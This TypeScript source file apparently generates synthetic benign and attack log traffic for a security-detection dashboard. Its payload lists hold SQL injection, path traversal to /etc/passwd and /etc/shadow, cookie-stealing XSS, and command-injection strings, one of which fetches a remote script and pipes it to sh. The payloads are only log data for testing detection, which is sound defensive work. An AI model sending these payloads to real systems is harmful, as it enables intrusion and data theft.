import type { RawLog } from '@argus/contracts';
import { apiGatewayLog, authLog, benignIp, nginxLog, pick, randInt } from './sources.js';

// The generator has two modes that share these builders (architecture §15):
//   - background noise: continuous low-rate *benign* traffic, so the dashboard
//     is never empty and reads as a live system.
//   - injectors: a scripted burst of *attack* traffic from one source, fired on
//     demand via POST /simulate/:scenario (or by the DEMO_MODE timeline).
// Detection rules live api-side; the generator just produces realistic traffic.

const BENIGN_USERS = ['jsmith', 'deploy', 'svc-backup', 'awong', 'mchen'] as const;
const BENIGN_PATHS = ['/', '/index.html', '/api/health', '/api/orders', '/assets/app.js'] as const;
const BENIGN_AGENTS = ['Mozilla/5.0', 'curl/8.4.0', 'Argus-Probe/1.0'] as const;

// one benign event, source chosen at random
export function benignEvent(): RawLog {
  const roll = randInt(3);
  const ip = benignIp();
  if (roll === 0) {
    // occasional benign auth failure (fat-fingered password) keeps noise honest
    const outcome = Math.random() < 0.15 ? 'failure' : 'success';
    return authLog({ user: pick(BENIGN_USERS), ip, outcome });
  }
  if (roll === 1) {
    return nginxLog({ ip, path: pick(BENIGN_PATHS), status: 200, userAgent: pick(BENIGN_AGENTS) });
  }
  return apiGatewayLog({
    ip,
    method: pick(['GET', 'POST']),
    path: pick(BENIGN_PATHS),
    status: 200,
    userAgent: pick(BENIGN_AGENTS),
    user: pick(BENIGN_USERS),
  });
}

export interface Scenario {
  name: string;
  description: string;
  generate: () => RawLog[];
}

// all attack traffic comes from a single attacker IP so it correlates cleanly
function attackerIp(): string {
  return `198.51.100.${1 + randInt(254)}`;
}

const SQLI_PAYLOADS = [
  "/products?id=1' OR '1'='1",
  '/products?id=1; DROP TABLE users--',
  '/search?q=%27%20UNION%20SELECT%20password%20FROM%20users--',
  "/login?user=admin'--",
] as const;

const ENUM_PATHS = [
  '/.env',
  '/.git/config',
  '/admin',
  '/wp-login.php',
  '/phpmyadmin',
  '/backup.zip',
  '/config.php',
  '/api/v1/internal',
] as const;

const SPRAY_USERS = [
  'admin',
  'root',
  'test',
  'oracle',
  'postgres',
  'ubuntu',
  'guest',
  'jenkins',
] as const;

// payloads are written without raw spaces (%20 instead): the nginx combined
// log format delimits the request line on spaces, like the real thing
const TRAVERSAL_PATHS = [
  '/download?file=../../../../etc/passwd',
  '/static/..%2f..%2f..%2fetc/shadow',
  '/api/files?path=%252e%252e%252f%252e%252e%252fwindows%252fwin.ini',
  '/images/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts',
] as const;

const XSS_PATHS = [
  '/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E',
  '/profile?name=%3Cimg%20src=x%20onerror=alert(1)%3E',
  '/redirect?url=javascript:alert(1)',
  '/comment?body=%3Csvg%2Fonload%3Dalert(1)%3E',
] as const;

const CMD_INJECTION_PATHS = [
  '/api/ping?host=127.0.0.1;cat%20/etc/passwd',
  '/api/ping?host=8.8.8.8|id',
  '/cgi-bin/status?cmd=%60whoami%60',
  '/api/export?name=report$(curl%20http://203.0.113.66/x.sh|sh)',
] as const;

export const SCENARIOS: Record<string, Scenario> = {
  'brute-force': {
    name: 'brute-force',
    description: 'A burst of failed SSH logins from one IP (trips brute-force-ssh).',
    generate: () => {
      const ip = attackerIp();
      const user = pick(['root', 'admin', 'oracle']);
      const attempts = 8 + randInt(4);
      const logs = Array.from({ length: attempts }, () =>
        authLog({ user, ip, outcome: 'failure' }),
      );
      // a successful login right after the burst = the scary "they got in" case
      if (Math.random() < 0.5) logs.push(authLog({ user, ip, outcome: 'success' }));
      return logs;
    },
  },

  'password-spray': {
    name: 'password-spray',
    description:
      'One failed login each across many accounts from one IP (trips password-spraying).',
    generate: () => {
      const ip = attackerIp();
      const users = [...SPRAY_USERS].sort(() => Math.random() - 0.5).slice(0, 6);
      return users.map((user) => authLog({ user, ip, outcome: 'failure' }));
    },
  },

  'account-takeover': {
    name: 'account-takeover',
    description:
      'Brute force against one account that ends in a successful login (trips login-after-brute-force).',
    generate: () => {
      const ip = attackerIp();
      const user = pick(['admin', 'deploy', 'svc-backup']);
      const logs = Array.from({ length: 6 + randInt(3) }, () =>
        authLog({ user, ip, outcome: 'failure' }),
      );
      logs.push(authLog({ user, ip, outcome: 'success' }));
      return logs;
    },
  },

  sqli: {
    name: 'sqli',
    description: 'SQL-injection probes against the API gateway (400/500s).',
    generate: () => {
      const ip = attackerIp();
      return SQLI_PAYLOADS.map((path) =>
        apiGatewayLog({
          ip,
          method: 'GET',
          path,
          status: pick([400, 403, 500]),
          userAgent: 'sqlmap/1.8',
        }),
      );
    },
  },

  'path-traversal': {
    name: 'path-traversal',
    description: 'Attempts to climb out of the web root, plain and double/overlong-encoded.',
    generate: () => {
      const ip = attackerIp();
      return TRAVERSAL_PATHS.map((path) =>
        nginxLog({ ip, path, status: pick([400, 403, 404]), userAgent: 'curl/8.4.0' }),
      );
    },
  },

  xss: {
    name: 'xss',
    description: 'Reflected cross-site scripting probes against the API gateway.',
    generate: () => {
      const ip = attackerIp();
      return XSS_PATHS.map((path) =>
        apiGatewayLog({
          ip,
          method: 'GET',
          path,
          status: pick([200, 400]),
          userAgent: 'Mozilla/5.0',
        }),
      );
    },
  },

  'command-injection': {
    name: 'command-injection',
    description: 'Shell metacharacter payloads aimed at a "ping this host" style endpoint.',
    generate: () => {
      const ip = attackerIp();
      return CMD_INJECTION_PATHS.map((path) =>
        apiGatewayLog({
          ip,
          method: 'GET',
          path,
          status: pick([400, 500]),
          userAgent: 'curl/8.4.0',
        }),
      );
    },
  },

  'dir-enum': {
    name: 'dir-enum',
    description: 'Directory / sensitive-file enumeration (a wall of 404s).',
    generate: () => {
      const ip = attackerIp();
      return ENUM_PATHS.map((path) =>
        nginxLog({ ip, path, status: pick([404, 403]), userAgent: 'gobuster/3.6' }),
      );
    },
  },

  'rate-abuse': {
    name: 'rate-abuse',
    description: 'High-rate hammering of one endpoint from a single IP.',
    generate: () => {
      const ip = attackerIp();
      const hits = 40 + randInt(20);
      return Array.from({ length: hits }, () =>
        apiGatewayLog({
          ip,
          method: 'POST',
          path: '/api/login',
          status: pick([200, 429]),
          userAgent: 'python-requests/2.32',
        }),
      );
    },
  },

  'invalid-jwt': {
    name: 'invalid-jwt',
    description: 'A flood of requests bearing invalid/expired JWTs (401s).',
    generate: () => {
      const ip = attackerIp();
      const hits = 12 + randInt(8);
      return Array.from({ length: hits }, () =>
        apiGatewayLog({
          ip,
          method: 'GET',
          path: '/api/account',
          status: 401,
          userAgent: 'okhttp/4.12',
        }),
      );
    },
  },
};

export const SCENARIO_NAMES = Object.keys(SCENARIOS);
